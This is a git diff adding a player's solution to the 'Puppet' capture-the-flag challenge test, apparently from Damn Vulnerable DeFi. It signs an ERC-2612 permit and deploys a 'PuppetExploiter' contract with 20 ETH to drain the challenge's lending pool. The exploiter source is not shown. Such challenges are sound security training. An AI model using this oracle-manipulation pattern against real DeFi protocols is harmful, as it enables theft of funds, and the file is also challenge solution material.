@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { signERC2612Permit } = require('eth-permit');
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,6 +96,34 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // Compute the address that the attack contract will deploy to. This is required
+        // for the ERC-2612 signature.
+        const attackContractAddress = ethers.utils.getContractAddress({
+            from: player.address,
+            nonce: 0 // The contract deployment will be the player's first (and only) transaction
+        });
+
+        // Generate ERC-2612 signature for `permit` using the `eth-permit` library
+        // v, r, and s is a secp256k1 signature, which will be verified by the token
+        // Note: signERC2612Permit automatically sets the `deadline` parameter to type(uint256).max
+        const { v, r, s } = await signERC2612Permit(
+            player,
+            token.address,
+            player.address,
+            attackContractAddress,
+            ethers.constants.MaxUint256
+        );
+
+        // Initialize the attack contract with 20 ETH and ERC-2612 signature to pull DVT
+        await ethers.getContractFactory('PuppetExploiter', player).then(c => c.deploy(
+            // uniswapExchange.address,
+            // token.address,
+            lendingPool.address,
+            v,
+            r,
+            s,
+            { value: ethers.utils.parseEther('20') }
+        ));
     });
 
     after(async function () {
